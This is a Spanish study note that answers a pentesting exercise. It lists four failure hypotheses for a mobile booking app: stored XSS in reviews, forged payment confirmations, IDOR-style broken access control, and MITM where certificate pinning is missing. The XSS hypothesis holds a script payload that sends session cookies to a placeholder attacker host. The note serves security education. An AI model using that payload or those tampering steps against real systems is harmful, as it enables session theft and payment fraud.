> [!example] Enunciado
> Una app móvil de experiencias curadas permite descubrir y reservar experiencias. Componentes: App móvil / API REST; autenticación OAuth; sistema de pagos externo (tipo Stripe); creadores publican ofertas; usuarios dejan reviews.
>
> Establecer 4 hipótesis de falla plausibles siguiendo la metodología de pentesting, con prueba concreta para cada una.

**Conceptos:**

* [[Metodología de Hipótesis de Falla]]
* [[CWE-79 - XSS]]
* [[Broken Access Control]]
* [[Certificate Pinning]]

**Hipótesis 1: XSS a través de las reviews**
- **Qué:** [[CWE-79 - XSS|Cross-Site Scripting]] almacenado en reviews de experiencias.
- **Por qué:** Texto libre de reviews mostrado a otros usuarios sin sanitizar.
- **Cómo:** Dejar una review con `<script>fetch('https://atacante.com/?token='+document.cookie)</script>`.
- **Impacto:** Robo de sesiones — reservar, dejar reviews falsas, acceder a datos personales.

**Hipótesis 2: Falsificación de confirmación de pago**
- **Qué:** Falta de validación server-side de la notificación del proveedor externo.
- **Por qué:** Si el backend no valida el origen de la notificación de pago, se puede simular.
- **Cómo:** Interceptar el flujo con proxy y enviar directamente al backend una confirmación simulada sin pago real.
- **Impacto:** Reservar experiencias sin pagar.

**Hipótesis 3: [[Broken Access Control]] en la API REST**
- **Qué:** Falta de verificación de autorización en endpoints de gestión de experiencias.
- **Por qué:** Si los endpoints solo verifican autenticación y no propiedad del recurso, cualquiera puede editar experiencias ajenas.
- **Cómo:** Interceptar el request de edición propia, cambiar `id_experiencia` por uno ajeno; probar también `DELETE`/`PUT` con IDs ajenos.
- **Impacto:** Modificar/eliminar experiencias y reviews de otros creadores.

**Hipótesis 4: MITM por falta de [[Certificate Pinning]]**
- **Qué:** Falta de certificate pinning en la app móvil.
- **Por qué:** Sin pinning, un atacante puede instalar un certificado propio y usar un proxy.
- **Cómo:** Emulador con proxy (Burp Suite) y certificado propio instalado; ver si se intercepta el tráfico HTTPS.
- **Impacto:** Ver tokens OAuth, datos personales/de pago, y modificar requests en tránsito.
